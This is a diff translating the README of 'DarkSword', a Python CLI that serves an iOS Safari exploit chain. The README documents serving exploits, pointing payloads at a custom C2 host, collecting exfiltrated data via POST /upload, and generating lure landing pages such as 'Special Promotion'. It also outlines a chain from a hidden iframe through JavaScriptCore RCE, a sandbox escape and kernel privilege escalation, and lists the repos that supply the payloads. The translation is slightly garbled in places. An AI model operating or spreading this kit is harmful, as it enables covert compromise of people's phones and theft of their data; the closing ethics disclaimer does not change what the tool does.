@@ -23,83 +23,92 @@ pip install -e .
 darksword serve
 ```
 
-Acesse de um dispositivo iOS (Safari): `http://<SEU_IP>:8080/`
+Access from an iOS device (Safari): `http://<YOUR_IP>:8080/`
 
-Payloads e kexploit ja incluidos. Para atualizar: `darksword sync` e `darksword sync-kexploit`
+Payloads and kexploit already included. To update: `darksword sync` and `darksword sync-kexploit`
 
 ## Client Commands
 
 | Command | Description |
+
 |---------|-----------|
-| `darksword serve` | Inicia servidor HTTP para entrega dos exploits |
-| `darksword sync` | Baixa payloads do repositório DarkSword-RCE |
-| `darksword list` | Lista payloads disponíveis localmente |
-| `darksword info` | Exibe informações sobre a cadeia e CVEs |
-| `darksword template generate` | Gera landing page personalizada |
-| `darksword template list` | Lista templates disponíveis |
-| `darksword sync-kexploit` | Baixa kernel exploit (opa334, Objective-C) |
+
+| `darksword serve` | Starts HTTP server for exploit delivery |
+
+| `darksword sync` | Downloads payloads from the DarkSword-RCE repository |
+
+| `darksword list` | Lists locally available payloads |
+
+| `darksword info` | Displays information about the chain and CVEs |
+
+| `darksword template generate` | Generates a custom landing page |
+
+| `darksword template list` | Lists available templates |
+
+| `darksword sync-kexploit` | Downloads kernel exploit (opa334, Objective-C) |
 
 ### `serve` Command
 
 ```
 darksword serve -H 0.0.0.0 -p 8080
-darksword serve -p 8443 --c2-host https://seu-c2.com/payload
+darksword serve -p 8443 --c2-host https://your-c2.com/payload
 ```
 
 - `-H, --host`: Host (default: 0.0.0.0)
 - `-p, --port` A: Door (Default: 8080)
-- `--c2-host`: Custom C2 (ex: ) - overwrites host/port on pe_main.
-- `--redirect`: URL de redirecionamento em fallback
+- `--c2-host`: Custom C2 (e.g., ) - overwrites host/port on pe_main.
 
-Sem `--c2-host`, o host/porta sao obtidos do Host header (mesmo servidor). Dados exfiltrados vao para `exfil/` e POST `/upload`.
+- `--redirect`: Fallback redirect URL
 
-### Gerar landing page customizada
+Without `--c2-host`, the host/port is obtained from the Host header (same server). Exfiled data goes to `exfil/` and POST `/upload`.
+
+### Generate a custom landing page
 
 ```bash
-darksword template generate --title "Promoção Especial" --redirect https://site-legitimo.com
+darksword template generate --title "Special Promotion" --redirect https://site-legitimo.com
 ```
 
-## Estrutura do Projeto
+## Project Structure
 
 ```
 DarkSword/
-├── darksword/           # Modulo Python
-│   ├── cli.py          # CLI principal
-│   ├── server.py       # Servidor HTTP
-│   ├── payloads.py     # Sync e gestao de payloads
-│   └── config.py
-├── payloads/            # Payloads Web (apos darksword sync)
-├── templates/           # Templates de landing page
-├── kexploit/            # Kernel exploit Obj-C (apos darksword sync-kexploit)
+├── darksword/ # Python Module
+│ ├── cli.py # Main CLI
+│ ├── server.py # HTTP Server
+│ ├── payloads.py # Payload Sync and Management
+│ └── config.py
+├── payloads/ # Web Payloads (after darksword sync)
+├── templates/ # Landing Page Templates
+├── kexploit/ # Kernel exploit Obj-C (after darksword) sync-kexploit)
 ├── pyproject.toml
 └── README.md
 ```
 
-### Verificacao repos
+### Repos check
 
-| Repo | Arquivos |
+| Repo | Files |
 |------|----------|
 | **htimesnine/DarkSword-RCE** | index.html, frame.html, rce_loader.js, rce_module*.js, rce_worker*.js, sbx*.js, pe_main.js |
-| **ghh-jb/DarkSword** | Identico (fallback) |
+| **ghh-jb/DarkSword** | Identical (fallback) |
 | **opa334/darksword-kexploit** | Makefile, src/main.m, entitlements.plist |
-| **Nao publico** | rce_worker_18.7.js (iOS 18.7) |
+| **Not public** | rce_worker_18.7.js (iOS 18.7) |
 
-## Fluxo da Cadeia DarkSword
+## DarkSword Chain Flow
 
-1. **index.html** → Landing page carrega frame.html em iframe oculto
-2. **frame.html** → Injeta rce_loader.js
-3. **rce_loader.js** → Carrega módulos RCE conforme versão do iOS
-4. **rce_module.js / rce_module_18.6.js** → Módulos RCE
-5. **rce_worker_18.4.js / rce_worker_18.6.js** → Web Workers (exploits JSC)
+1. **index.html** → Landing page loads frame.html in a hidden iframe
+2. **frame.html** → Injects rce_loader.js
+3. **rce_loader.js** → Loads RCE modules according to the iOS version
+4. **rce_module.js / rce_module_18.6.js** → RCE modules
+5. **rce_worker_18.4.js / rce_worker_18.6.js** → Web Workers (JSC exploits)
 6. **sbx0_main_18.4.js / sbx1_main.js** → Sandbox escape
 7. **pe_main.js** → Privilege escalation
 
-## Requisitos Éticos
+## Ethical Requirements
 
-- **Autorização**: Use apenas contra sistemas que você tem permissão explícita para testar
-- **Escopo**: Respeite os limites definidos no contrato/escopo do engajamento
-- **Documentação**: Registre todas as atividades para relatórios de red team
+- **Authorization**: Use only against systems you have permission for Explicit for testing
+- **Scope**: Respect the limits defined in the engagement contract/scope
+- **Documentation**: Record all activities 
 
-## Licença
+## License
 
-MIT - Apenas para fins educacionais e de testes de segurança autorizados.
+MIT - For authorized educational and security testing purposes only.
